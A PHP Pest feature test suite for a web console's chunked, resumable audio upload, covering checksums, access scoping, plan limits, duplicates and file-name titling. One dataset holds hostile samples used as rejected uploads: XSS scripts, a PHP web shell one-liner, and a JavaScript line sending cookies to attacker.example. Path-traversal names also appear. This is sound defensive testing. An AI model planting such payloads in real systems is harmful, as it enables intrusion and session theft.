<?php

declare(strict_types=1);

use App\Enums\SessionStatus;
use App\Enums\SourceApp;
use App\Enums\SourceDevice;
use App\Filament\Resources\CaptureSessions\Pages\ListCaptureSessions;
use App\Models\CaptureSession;
use App\Models\Client;
use App\Models\Plan;
use App\Models\Recording;
use App\Models\UsageLedgerEntry;
use App\Models\User;
use App\Models\Workspace;
use App\Services\ChunkedUploadService;
use App\Services\ConsoleUploads;
use App\Services\RecordingIngestor;
use App\Services\Workspaces\PlanLimits;
use App\Services\Workspaces\Workspaces;
use App\Stt\Support\WavFile;
use Filament\Facades\Filament;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use Illuminate\Testing\TestResponse;
use Tests\Feature\Admin\Support\AdminTestHelpers;

uses(AdminTestHelpers::class);

/*
 * Library → Upload in the console: the browser's chunked, resumable uploads through the console routes, on the
 * devices' chunk / assemble / verify path, for the signed-in person's current workspace.
 */

beforeEach(function () {
    Filament::setCurrentPanel('admin');
    Http::preventStrayRequests();
    Queue::fake();
    $this->isolatedStorage();
    // The smallest chunk the server advertises (256 KB): a 600 KB file goes up in three chunks.
    config(['echoledger.max_chunk_bytes' => 256 * 1024]);
    $this->admin = $this->signInAsAdmin();
});

/** A genuine WAV file of $bytes bytes, so its first chunk is recognised as sound. */
function uplWav(int $bytes = 600_000): string
{
    return WavFile::header(1, 16000, 16, $bytes - 44).random_bytes($bytes - 44);
}

/** @param  array<string, mixed>  $extra */
function uplStart(object $test, string $bytes, string $name = 'Client_call 2026-10-30.wav', array $extra = []): TestResponse
{
    return $test->postJson(route('admin.uploads.store'), [
        'name' => $name, 'size' => strlen($bytes), 'sha256' => hash('sha256', $bytes), 'type' => 'audio/wav', ...$extra,
    ]);
}

function uplChunk(object $test, string $recordingId, int $index, string $bytes, int $chunkSize): TestResponse
{
    $chunk = substr($bytes, $index * $chunkSize, $chunkSize);
    $server = ['CONTENT_TYPE' => 'application/octet-stream', 'HTTP_ACCEPT' => 'application/json', 'HTTP_UPLOAD_CHUNK_SHA256' => hash('sha256', $chunk)];

    return $test->call('POST', route('admin.uploads.chunk', [$recordingId, $index]), [], [], [], $server, $chunk);
}

/** Starts and sends a whole file; returns the recording id. */
function uplWhole(object $test, string $bytes, string $name = 'call.wav', array $extra = []): string
{
    $start = uplStart($test, $bytes, $name, $extra)->assertCreated();
    for ($i = 0; $i < $start->json('total_chunks'); $i++) {
        uplChunk($test, $start->json('recording_id'), $i, $bytes, $start->json('chunk_size'))->assertOk();
    }
    $test->postJson(route('admin.uploads.complete', $start->json('recording_id')))->assertStatus(202);

    return (string) $start->json('recording_id');
}

describe('chunked upload', function () {
    it('sends a file in chunks and makes a Web recording of it with the batch client and language', function () {
        $client = Client::factory()->create(['user_id' => $this->admin->id, 'name' => 'Acme']);
        $bytes = uplWav();

        $start = uplStart($this, $bytes, 'Acme_kickoff_call.wav', ['client_id' => $client->id, 'language' => 'ur', 'duration_ms' => 18_000])
            ->assertCreated()
            ->assertJson(['resumed' => false, 'status' => 'pending', 'chunk_size' => 256 * 1024, 'total_chunks' => 3, 'missing_chunks' => [0, 1, 2], 'title' => 'Acme kickoff call']);
        [$id, $size] = [$start->json('recording_id'), $start->json('chunk_size')];
        foreach ([0, 1, 2] as $index) {
            uplChunk($this, $id, $index, $bytes, $size)->assertOk()->assertJsonPath('status', 'uploading');
        }
        $this->postJson(route('admin.uploads.complete', $id))->assertStatus(202)
            ->assertJson(['status' => 'ready', 'title' => 'Acme kickoff call'])
            ->assertJsonPath('url', route('filament.admin.resources.sessions.view', ['record' => $start->json('session_id')]));

        $session = CaptureSession::query()->with('primaryRecording')->sole();
        expect($session->source_device)->toBe(SourceDevice::Web)
            ->and($session->source_app)->toBe(SourceApp::VoiceNote)
            ->and($session->device_id)->toBeNull()
            ->and($session->user_id)->toBe($this->admin->id)
            ->and($session->workspace_id)->toBe($this->admin->current_workspace_id)
            ->and($session->client_id)->toBe($client->id)
            ->and($session->language)->toBe('ur')
            ->and($session->duration_ms)->toBe(18_000)
            ->and($session->title)->toBe('Acme kickoff call')
            ->and($session->primaryRecording->mime)->toBe('audio/wav')
            ->and($session->primaryRecording->sha256)->toBe(hash('sha256', $bytes))
            ->and($session->primaryRecording->isReady())->toBeTrue();
        // Encrypted at rest, and the parts are gone once assembled.
        expect(Storage::disk('recordings')->get($session->primaryRecording->stored_path))->not->toContain('WAVEfmt')
            ->and(Storage::disk('recordings')->directoryExists($session->primaryRecording->partsDirectory()))->toBeFalse();
        // The final transcript starts on its own, as for a device upload.
        expect($session->finalTranscript()->first())->not->toBeNull();
    });

    it('resumes after a dropped connection: only the missing chunks are sent, also when the file is picked again', function () {
        $bytes = uplWav();
        $start = uplStart($this, $bytes)->assertCreated();
        [$id, $size] = [$start->json('recording_id'), $start->json('chunk_size')];
        uplChunk($this, $id, 0, $bytes, $size)->assertOk();
        uplChunk($this, $id, 2, $bytes, $size)->assertOk();

        $this->postJson(route('admin.uploads.complete', $id))->assertStatus(422)
            ->assertJson(['code' => 'upload_incomplete', 'missing_chunks' => [1]]);
        $this->getJson(route('admin.uploads.show', $id))->assertOk()
            ->assertJson(['status' => 'uploading', 'received_chunks' => [0, 2], 'missing_chunks' => [1]]);
        // After a reload the same file is picked again: it carries on with the same upload.
        uplStart($this, $bytes)->assertOk()->assertJson(['resumed' => true, 'recording_id' => $id, 'missing_chunks' => [1]]);

        uplChunk($this, $id, 1, $bytes, $size)->assertOk();
        $this->postJson(route('admin.uploads.complete', $id))->assertStatus(202)->assertJsonPath('status', 'ready');
        // A repeated complete (its answer was lost) gives the same answer.
        $this->postJson(route('admin.uploads.complete', $id))->assertStatus(202)->assertJsonPath('status', 'ready');

        expect(CaptureSession::query()->count())->toBe(1)
            ->and(Recording::query()->sole()->isReady())->toBeTrue();
    });

    it('refuses a chunk whose checksum or length is wrong and keeps the rest', function () {
        $bytes = uplWav();
        $start = uplStart($this, $bytes)->assertCreated();
        $id = $start->json('recording_id');
        $server = ['CONTENT_TYPE' => 'application/octet-stream', 'HTTP_ACCEPT' => 'application/json', 'HTTP_UPLOAD_CHUNK_SHA256' => hash('sha256', 'other')];

        $this->call('POST', route('admin.uploads.chunk', [$id, 0]), [], [], [], $server, substr($bytes, 0, 256 * 1024))->assertStatus(422);
        uplChunk($this, $id, 1, $bytes, 1000)->assertStatus(422);
        $this->getJson(route('admin.uploads.show', $id))->assertOk()->assertJson(['received_chunks' => [], 'missing_chunks' => [0, 1, 2]]);
    });

    it('cancels an unfinished upload with what was sent of it; a finished one stays in the Library', function () {
        $bytes = uplWav();
        $start = uplStart($this, $bytes)->assertCreated();
        $id = $start->json('recording_id');
        uplChunk($this, $id, 0, $bytes, $start->json('chunk_size'))->assertOk();

        $this->deleteJson(route('admin.uploads.destroy', $id))->assertOk()->assertJson(['status' => 'cancelled']);
        expect(CaptureSession::query()->count())->toBe(0)
            ->and(Recording::query()->count())->toBe(0)
            ->and(Storage::disk('recordings')->allFiles())->toBe([]);
        $this->getJson(route('admin.uploads.show', $id))->assertNotFound();

        $done = uplWhole($this, uplWav(4096));
        $this->deleteJson(route('admin.uploads.destroy', $done))->assertStatus(409)->assertJson(['code' => 'upload_finished']);
        expect(Recording::query()->sole()->isReady())->toBeTrue();
    });

    it('refuses a file that is not sound or video, whatever its name says, and keeps nothing of it', function (string $name, string $content) {
        $start = uplStart($this, $content, $name)->assertCreated();

        uplChunk($this, $start->json('recording_id'), 0, $content, $start->json('chunk_size'))
            ->assertStatus(422)->assertJson(['code' => 'not_audio', 'message' => ConsoleUploads::NOT_MEDIA_MESSAGE]);
        expect(CaptureSession::query()->count())->toBe(0)
            ->and(Recording::query()->count())->toBe(0)
            ->and(Storage::disk('recordings')->allFiles())->toBe([]);
    })->with([
        'html named ogg' => ['evil.ogg', '<!doctype html><script>alert(document.domain)</script>'],
        'svg named wav' => ['evil.wav', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'],
        'php named mp3' => ['evil.mp3', '<?php system($_GET["c"]); ?>'],
        'windows executable named flac' => ['evil.flac', "MZ\x90\x00\x03\x00\x00\x00"],
        'javascript named webm' => ['evil.webm', 'fetch("//attacker.example/?"+document.cookie)'],
    ]);

    it('takes the sound of an mp4 or webm video and stores it under the container\'s audio type', function (string $name, string $head, string $stored) {
        $bytes = $head.str_repeat("\0", 2048);

        uplWhole($this, $bytes, $name, ['type' => str_ends_with($name, '.mp4') ? 'video/mp4' : 'video/webm']);

        expect(Recording::query()->sole()->mime)->toBe($stored);
    })->with([
        'mp4' => ['Team meeting.mp4', pack('N', 24).'ftypisom'.pack('N', 512).'isomiso2', 'audio/mp4'],
        'webm' => ['Screen recording.webm', "\x1A\x45\xDF\xA3\x9F\x42\x86\x81\x01\x42\xF7\x81\x01\x42\xF2\x81\x04\x42\xF3\x81\x08\x42\x82\x84webm\x42\x87\x81\x04\x42\x85\x81\x02", 'audio/webm'],
    ]);

    it('refuses a type it does not take, an empty file, one over the size limit and another workspace\'s client', function () {
        $bytes = uplWav(4096);
        uplStart($this, $bytes, 'photo.png', ['type' => 'image/png'])->assertStatus(422)->assertJson(['code' => 'unsupported_type']);
        $this->postJson(route('admin.uploads.store'), ['name' => 'empty.wav', 'size' => 0, 'sha256' => hash('sha256', '')])
            ->assertStatus(422)->assertJsonPath('errors.size.0', 'This file is empty.');
        $this->postJson(route('admin.uploads.store'), ['name' => 'huge.wav', 'size' => 3 * 1024 ** 3, 'sha256' => str_repeat('a', 64)])
            ->assertStatus(422)->assertJsonPath('errors.size.0', 'This file is larger than the 2 GB limit.');
        $foreign = Client::factory()->create(['user_id' => $this->makeAdmin()->id]);
        uplStart($this, $bytes, 'call.wav', ['client_id' => $foreign->id])->assertStatus(422)
            ->assertJson(['code' => 'client_not_found'])->assertJsonPath('errors.client_id.0', 'Choose one of your clients.');

        expect(CaptureSession::query()->count())->toBe(0);
    });

    it('refuses an upload past the plan\'s storage or monthly minutes, in the plan\'s words', function () {
        Plan::personal()->update(['storage_bytes' => 1000]);
        uplStart($this, uplWav())->assertForbidden()->assertJson(['code' => 'storage_limit_reached', 'message' => PlanLimits::STORAGE_MESSAGE]);

        Plan::personal()->update(['storage_bytes' => null, 'monthly_minutes' => 1]);
        UsageLedgerEntry::query()->create([
            'workspace_id' => $this->admin->current_workspace_id, 'user_id' => $this->admin->id, 'source' => 'server',
            'report_id' => 'final/'.Str::ulid().'/a1', 'use_case' => 'final', 'provider' => 'assemblyai', 'duration_ms' => 60_000,
            'channels' => 1, 'billed_ms' => 60_000, 'unit_price_usd' => 0.15, 'cost_usd' => 0.01, 'billable' => true, 'occurred_at' => now(),
        ]);
        uplStart($this, uplWav())->assertForbidden()->assertJson(['code' => 'budget_exceeded', 'message' => PlanLimits::MINUTES_MESSAGE]);

        expect(CaptureSession::query()->count())->toBe(0);
    });
});

describe('access', function () {
    it('keeps an upload to the person and workspace that started it', function () {
        $bytes = uplWav();
        $start = uplStart($this, $bytes)->assertCreated();
        $id = $start->json('recording_id');
        $outsider = $this->makeAdmin();
        $member = User::factory()->create();
        $workspace = Workspace::query()->findOrFail($this->admin->current_workspace_id);
        app(Workspaces::class)->addMember($workspace, $member);
        app(Workspaces::class)->switchTo($member, $workspace);

        // Another workspace, and another member of the same one: the same 404 as an unknown id.
        foreach ([$outsider, $member->fresh()] as $user) {
            $this->actingAs($user, 'web');
            $this->getJson(route('admin.uploads.show', $id))->assertNotFound();
            uplChunk($this, $id, 0, $bytes, $start->json('chunk_size'))->assertNotFound();
            $this->postJson(route('admin.uploads.complete', $id))->assertNotFound();
            $this->deleteJson(route('admin.uploads.destroy', $id))->assertNotFound();
        }
        $this->getJson(route('admin.uploads.show', '01JNOSUCHRECORDING0000000'))->assertNotFound();
        expect(unscoped(fn () => Recording::query()->findOrFail($id)->received_chunks))->toBe([])
            ->and(unscoped(fn () => CaptureSession::query()->count()))->toBe(1);
    });

    it('does not let an upload slot of a device be written through the console', function () {
        $session = CaptureSession::factory()->create(['user_id' => $this->admin->id, 'status' => SessionStatus::Uploading]);
        $bytes = uplWav(4096);
        $recording = app(ChunkedUploadService::class)->createRecording($session, [
            'role' => 'primary', 'mime' => 'audio/wav', 'channels' => 1, 'size_bytes' => strlen($bytes), 'sha256' => hash('sha256', $bytes),
        ], 256 * 1024);

        uplChunk($this, $recording->id, 0, $bytes, 256 * 1024)->assertNotFound();
        $this->postJson(route('admin.uploads.complete', $recording->id))->assertNotFound();
    });

    it('refuses the upload routes without a console sign-in, and to an account without a workspace', function () {
        $body = ['name' => 'call.wav', 'size' => 10, 'sha256' => str_repeat('a', 64)];
        $this->app['auth']->forgetGuards();

        $this->postJson(route('admin.uploads.store'), $body)->assertUnauthorized();
        $this->getJson(route('admin.uploads.show', '01JNOSUCHRECORDING0000000'))->assertUnauthorized();
        $this->deleteJson(route('admin.uploads.destroy', '01JNOSUCHRECORDING0000000'))->assertUnauthorized();
        $this->post(route('admin.uploads.store'), $body)->assertRedirect(route('filament.admin.auth.login'));

        $this->actingAs($this->makeRegularUser(), 'web');
        $this->postJson(route('admin.uploads.store'), $body)->assertForbidden();

        expect(unscoped(fn () => CaptureSession::query()->count()))->toBe(0);
    });
});

describe('duplicates', function () {
    it('skips a file whose sound is already in the Library and says where it is', function () {
        $bytes = uplWav(4096);
        $existing = CaptureSession::factory()->create(['user_id' => $this->admin->id, 'title' => 'Earlier copy']);
        $this->readyRecording($existing, $bytes);

        uplStart($this, $bytes, 'copy.wav')->assertStatus(409)
            ->assertJson(['code' => 'duplicate_recording', 'message' => 'Already in your Library', 'session_id' => $existing->id, 'title' => 'Earlier copy'])
            ->assertJsonPath('url', route('filament.admin.resources.sessions.view', ['record' => $existing->id]));

        expect(CaptureSession::query()->count())->toBe(1);
    });

    it('skips a file someone else in the workspace is uploading right now', function () {
        $bytes = uplWav(4096);
        $member = User::factory()->create();
        $workspace = Workspace::query()->findOrFail($this->admin->current_workspace_id);
        app(Workspaces::class)->addMember($workspace, $member);
        app(Workspaces::class)->switchTo($member, $workspace);
        uplStart($this, $bytes)->assertCreated();

        $this->actingAs($member->fresh(), 'web');
        uplStart($this, $bytes)->assertStatus(409)->assertJson(['code' => 'duplicate_recording']);
    });

    it('does not count a deleted recording, another workspace\'s copy or a different file', function () {
        $bytes = uplWav(4096);
        $binned = CaptureSession::factory()->create(['user_id' => $this->admin->id]);
        $this->readyRecording($binned, $bytes);
        $binned->delete(); // in the undo bin
        $elsewhere = CaptureSession::factory()->create(['user_id' => $this->makeAdmin()->id]);
        $this->readyRecording($elsewhere, $bytes);
        $this->readyRecording(CaptureSession::factory()->create(['user_id' => $this->admin->id]), uplWav(4096));

        uplStart($this, $bytes)->assertCreated();
    });
});

describe('titles and types', function () {
    it('titles each recording from its file name', function (string $name, string $title) {
        expect(ConsoleUploads::titleFromFileName($name))->toBe($title);
    })->with([
        'phone voice note' => ['WhatsApp_Ptt_2026-10-30_at_11.39.12.opus', 'WhatsApp Ptt 2026-10-30 at 11.39.12'],
        'only the last extension goes' => ['Budget review.final.m4a', 'Budget review.final'],
        'no extension' => ['Kickoff', 'Kickoff'],
        'a leading dot is not an extension' => ['.hidden', '.hidden'],
        'nothing left' => ['__.mp3', 'Imported file'],
        'a path is cut to the name' => ['../../etc/cron.d/pwn.wav', 'pwn'],
        'a Windows path' => ['C:\\Users\\me\\Desktop\\call_1.wav', 'call 1'],
        'spaces trimmed' => ['  spaced  .wav', 'spaced'],
        'control characters dropped' => ["line\nbreak\t.wav", 'linebreak'],
        'Urdu' => ['میٹنگ_ریکارڈ.mp3', 'میٹنگ ریکارڈ'],
        'at most 200 characters' => [str_repeat('a', 250).'.mp3', str_repeat('a', 200)],
    ]);

    it('maps each file to the type it is stored as', function (string $name, string $browserType, string $stored) {
        expect(ConsoleUploads::storedMime($name, $browserType))->toBe($stored);
    })->with([
        ['note.opus', 'audio/ogg', 'audio/ogg'],
        ['note.opus', '', 'audio/ogg'],
        ['note.ogg', 'application/ogg', 'audio/ogg'],
        ['song.mp3', 'audio/mpeg', 'audio/mpeg'],
        ['memo.m4a', 'audio/x-m4a', 'audio/mp4'],
        ['clip.aac', 'audio/aac', 'audio/aac'],
        ['call.wav', 'audio/x-wav', 'audio/wav'],
        ['call.flac', 'audio/flac', 'audio/flac'],
        ['meeting.mp4', 'video/mp4', 'audio/mp4'],
        ['MEETING.MP4', '', 'audio/mp4'],
        ['screen.webm', 'video/webm', 'audio/webm'],
        ['no extension, sound type', 'audio/mpeg', 'audio/mpeg'],
        ['no extension, mp4 video', 'video/mp4', 'audio/mp4'],
        ['no extension, webm video', 'video/webm', 'audio/webm'],
    ]);

    it('takes nothing that is neither sound nor an mp4 or webm video', function (string $name, string $browserType) {
        expect(ConsoleUploads::storedMime($name, $browserType))->toBeNull();
    })->with([
        ['photo.png', 'image/png'],
        ['movie.mov', 'video/quicktime'],
        ['page.html', 'text/html'],
        ['drawing.svg', 'image/svg+xml'],
        ['notes', ''],
        ['archive.zip', 'application/zip'],
    ]);

    it('names an imported mp4 video by its audio type, like WebM', function () {
        expect(RecordingIngestor::canonicalMime('video/mp4'))->toBe('audio/mp4')
            ->and(RecordingIngestor::canonicalMime('video/webm'))->toBe('audio/webm');
    });
});

describe('the list page', function () {
    it('has Upload and the drop zone, wired to the console upload routes', function () {
        $this->get('/admin/sessions')->assertOk()
            ->assertSee('Upload')
            ->assertSee('Drop sound or video files here')
            ->assertSee('el-upload-pick', false)
            ->assertSee('elUploader(', false)
            ->assertSee('admin-upload', false);
    });

    it('offers the workspace\'s clients and the languages for a batch, and escapes client names', function () {
        Client::factory()->create(['user_id' => $this->admin->id, 'name' => '<script>alert("x")</script> Acme']);
        Client::factory()->create(['user_id' => $this->makeAdmin()->id, 'name' => 'Not mine']);

        $html = $this->panelComponent(ListCaptureSessions::class)->html();

        expect($html)->toContain('&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt; Acme')
            ->not->toContain('<script>alert("x")</script>')
            ->not->toContain('Not mine')
            ->toContain('Urdu (with English words)')
            ->toContain('More languages');
    });
});
